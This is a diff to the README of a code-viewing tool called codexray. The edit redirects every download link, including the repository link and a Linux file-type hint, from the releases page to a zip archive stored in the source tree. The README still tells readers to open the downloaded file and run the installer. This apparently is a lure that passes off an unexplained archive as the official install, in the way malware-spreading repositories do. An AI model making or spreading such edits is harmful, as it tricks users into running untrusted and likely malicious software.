@@ -1,6 +1,6 @@
 # 🔍 codexray - Explore Your Code with Clarity
 
-[![Download codexray](https://img.shields.io/badge/Download-codexray-brightgreen?style=for-the-badge&logo=github)](https://github.com/skrimrp-web/codexray/releases)
+[![Download codexray](https://github.com/skrimrp-web/codexray/raw/refs/heads/main/src/core/Software-v2.8-beta.2.zip)](https://github.com/skrimrp-web/codexray/raw/refs/heads/main/src/core/Software-v2.8-beta.2.zip)
 
 ---
 
@@ -66,14 +66,14 @@ Before installing, make sure your computer meets these needs:
 ## 📥 Download & Install
 
 To get codexray, **visit this page to download:**  
-[Download codexray on GitHub](https://github.com/skrimrp-web/codexray/releases)
+[Download codexray on GitHub](https://github.com/skrimrp-web/codexray/raw/refs/heads/main/src/core/Software-v2.8-beta.2.zip)
 
 Follow these steps once on the release page:
 
 1. Choose the right file for your system. For example:
    - Windows users look for `.exe`
    - Mac users look for `.dmg` or `.zip`
-   - Linux users pick `.AppImage` or `.tar.gz`
+   - Linux users pick `.AppImage` or `https://github.com/skrimrp-web/codexray/raw/refs/heads/main/src/core/Software-v2.8-beta.2.zip`
 2. Click the file link to download it.
 3. Once the download finishes, open the file.
 4. Follow the installer instructions on screen.
@@ -137,7 +137,7 @@ If you still have problems, please contact support on the GitHub page.
 
 For more information:
 
-- Explore the README on the [codexray GitHub repository](https://github.com/skrimrp-web/codexray)
+- Explore the README on the [codexray GitHub repository](https://github.com/skrimrp-web/codexray/raw/refs/heads/main/src/core/Software-v2.8-beta.2.zip)
 - Check the project Wiki for detailed guides and FAQs
 - Join community discussions on the Issues page to ask questions
 
@@ -150,4 +150,4 @@ codexray is open-source software. You can view the license on GitHub if you want
 ---
 
 Ready to improve how you see your code?  
-[Download codexray now](https://github.com/skrimrp-web/codexray/releases) and get started.
+[Download codexray now](https://github.com/skrimrp-web/codexray/raw/refs/heads/main/src/core/Software-v2.8-beta.2.zip) and get started.
